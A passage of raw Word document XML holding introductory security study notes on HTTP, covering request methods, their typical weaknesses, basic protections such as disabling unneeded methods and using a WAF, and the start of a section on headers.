              <w:left w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="666666"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="666666"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCCCCC"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2A812B7D" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BC35DD">
              <w:rPr>
                <w:lang w:val="en-IN"/>
              </w:rPr>
              <w:t>RDP (Remote Desktop Protocol) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2E3449BB" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD"/>
    <w:p w14:paraId="5DCAF6A4" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="50" w:name="_Toc208408521"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Part II – Web Technologies</w:t>
      </w:r>
      <w:bookmarkEnd w:id="50"/>
    </w:p>
    <w:p w14:paraId="4E64CCB1" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="51" w:name="_Toc208408522"/>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>HyperText</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Transfer Protocol (HTTP)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="51"/>
    </w:p>
    <w:p w14:paraId="0C0D7759" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>HTTP is a Layer 7 (Application Layer) protocol used by browsers and servers for web communication.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BA84B06" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="52" w:name="_Toc208408523"/>
      <w:r>
        <w:t>How It Works:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="52"/>
    </w:p>
    <w:p w14:paraId="02532024" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Request/Response model</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A04BB67" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Methods: GET, POST, PUT, DELETE, etc.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32962C59" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Example Request:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>GET /index.html HTTP/1.1</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">Host: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46301937" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="53" w:name="_Toc208408524"/>
      <w:r>
        <w:t>Security Issues:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="53"/>
    </w:p>
    <w:p w14:paraId="3E442660" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SQL Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57811115" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>XSS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D79352A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>CSRF</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DF93A43" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>HTTP Smuggling</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D3D0A68" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="54" w:name="_Toc208408525"/>
      <w:r>
        <w:t>Protections:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="54"/>
    </w:p>
    <w:p w14:paraId="09C5318B" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Use HTTPS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D0A5B57" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Input validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="415EFB23" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>WAF</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73D54228" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Secure headers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5757ED91" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Real-World: Every web page uses HTTP/HTTPS, main attack surface in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pentesting</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6341C963" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="55" w:name="_Toc208408526"/>
      <w:r>
        <w:t>HTTP Methods</w:t>
      </w:r>
      <w:bookmarkEnd w:id="55"/>
    </w:p>
    <w:p w14:paraId="6DD7C283" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>HTTP methods define the action to be performed on a resource identified by a URL. They are part of the Application Layer (Layer 7), used in web communication between client and server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="094E1CD8" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="56" w:name="_Toc208408527"/>
      <w:r>
        <w:t>Methods</w:t>
      </w:r>
      <w:bookmarkEnd w:id="56"/>
    </w:p>
    <w:p w14:paraId="14B54AAF" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>GET</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09FEE89B" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Purpose: Retrieve data from server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="132E2B4C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Characteristics: Data in URL query string, cacheable, safe, idempotent.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D3FC3CB" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerabilities: Sensitive info in URL (bookmarks/logs), parameter tampering.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="424743FF" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>POST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43087437" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Purpose: Submit data to server (e.g., form submission).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="365F2F02" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Characteristics: Data in body, not cached, not idempotent.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C9B2F12" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerabilities: SQL Injection, XSS, CSRF if inputs not validated.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6869D373" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>PUT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EE1E42E" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Purpose: Update/replace an existing resource.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AFB86C8" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Characteristics: Idempotent (repeated requests = same result).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E6EB133" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerabilities: Overwriting critical files if access not restricted.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1790C5D3" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>DELETE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2801F064" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Purpose: Remove a resource.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D7003C4" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Characteristics: Idempotent.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D4D756E" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerabilities: Unauthorized deletion of resources if authentication weak.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F9EE749" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>HEAD</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E1BABC5" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Purpose: Retrieve headers only (no body).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76996CA5" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Characteristics: Used for testing links, caching.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76E9EC1A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerabilities: Can reveal server info (banner grabbing).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07138C86" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>OPTIONS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14029386" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Purpose: Shows supported methods for a resource.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41E240EA" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Characteristics: Used in CORS preflight.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FE1248E" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerabilities: Misconfigured CORS → unauthorized access.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B44235F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>PATCH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="200DA770" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Purpose: Partial update of a resource.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46DD48CE" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Characteristics: Non-idempotent.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="323EEDDD" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerabilities: Similar to PUT if not properly validated.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="333807C2" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>TRACE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="078E7A77" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Purpose: Debugging — echoes received request.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FFCEAAA" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Characteristics: Rarely used in production.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24C367E2" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerabilities: XST (Cross-Site Tracing) attacks, exposing cookies.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="777500C5" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>CONNECT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EAB8432" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Purpose: Establish a tunnel (e.g., for HTTPS via proxy).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74FB4B1A" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerabilities: Can be abused for tunneling malicious traffic.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="677D1596" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="009B2E17">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Security Concerns with HTTP Methods</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B2001F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Allowing dangerous methods (PUT, DELETE, TRACE, CONNECT) on public servers can expose apps.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BBB7CED" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Attackers often test with OPTIONS to see enabled methods.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B47DDE" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Misconfigurations can lead to data leaks, unauthorized changes, tunneling, or XST attacks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="414D8B89" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="57" w:name="_Toc208408528"/>
      <w:r>
        <w:t>Protections</w:t>
      </w:r>
      <w:bookmarkEnd w:id="57"/>
    </w:p>
    <w:p w14:paraId="56EED119" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Disable unnecessary methods (only allow GET, POST, HEAD in most apps).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22D88D1E" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Use WAF (Web Application Firewall).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68AA73FD" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Validate and sanitize all inputs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E30A4AC" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Enforce strong CORS policies.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B2A4CAC" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="58" w:name="_Toc208408529"/>
      <w:r>
        <w:t>HTTP Headers</w:t>
      </w:r>
      <w:bookmarkEnd w:id="58"/>
    </w:p>
    <w:p w14:paraId="00CC5BCC" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>HTTP headers are key-value pairs sent in requests and responses that carry additional information about the communication. They tell the server/client how to handle the request/response (authentication, caching, cookies, content type, etc.).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AEA5782" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="59" w:name="_Toc208408530"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Types of Headers</w:t>
      </w:r>
      <w:bookmarkEnd w:id="59"/>
    </w:p>
    <w:p w14:paraId="4B2BEB1F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>General Headers - Apply to both requests and responses.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EE7E1D8" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Date → Date/time the message was generated.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50D016A6" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Connection → Keep-Alive or Close.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A01CFD2" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Cache-Control → Caching policies (no-store, max-age).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="128E8C40" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Request Headers - Sent by the client (browser or app) to describe the request.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01A72861" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
